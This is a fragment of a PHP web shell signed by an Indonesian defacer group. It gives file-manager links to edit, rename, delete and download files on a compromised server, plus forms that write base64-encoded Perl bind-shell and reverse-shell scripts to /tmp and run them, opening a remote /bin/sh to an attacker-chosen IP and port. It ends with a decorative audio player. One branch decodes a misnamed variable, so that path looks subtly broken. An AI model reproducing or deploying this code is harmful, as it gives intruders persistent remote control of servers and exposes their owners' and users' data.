      echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
    }
    echo "</tr></table>";
 echo "<form method='post'>
    <u>Bind Port:</u> <br>
    PORT: <input type='text' placeholder='port' name='port_bind' value='1337'>
    <input type='submit' name='sub_bp' value='>>'>
    </form>
    <form method='post'>
    <u>Back Connect:</u> <br>
    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>
    PORT: <input type='text' placeholder='port' name='port_bc' value='1337'>
    <input type='submit' name='sub_bc' value='>>'>
    </form>";   $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if(isset($_POST['sub_bp'])) {
        $f_bp = fopen("/tmp/bp.pl", "w");
        fwrite($f_bp, base64_decode($bind_port_p));
        fclose($f_bp);
 
        $port = $_POST['port_bind'];
        $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
        unlink("/tmp/bp.pl");
    }
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    if(isset($_POST['sub_bc'])) {
        $f_bc = fopen("/tmp/bc.pl", "w");
        fwrite($f_bc, base64_decode($bind_connect_p));
        fclose($f_bc);
 
        $ipbc = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
        unlink("/tmp/bc.pl");
    }
    }
    }

   
   echo "<center>-All Defacer Indonesian @ ".date("Y")." SasKraXploit-</font></a></center>";
}


?>
<br>
    <center>
<audio id="myAudio">
            <source src="https://i.top4top.io/m_2337d0odj1.mp3" type="audio/ogg">
            <source src="https://i.top4top.io/m_2337d0odj1.mp3" type="audio/mpeg">
        </audio>
        <button style=background-color:red onclick="playAudio()" class="btnn" type="button">PLAY!!</button>
        &nbsp;&nbsp;
        <button style=background-color:yellow onclick="pauseAudio()" class="btnn" type="button">STOP?</button></center>
        <script>
              var x = document.getElementById("myAudio"); 

              function playAudio() { 
                  x.play(); 
              } 

               function pauseAudio() { 
                  x.pause(); 
              } 
        </script>
 </center> 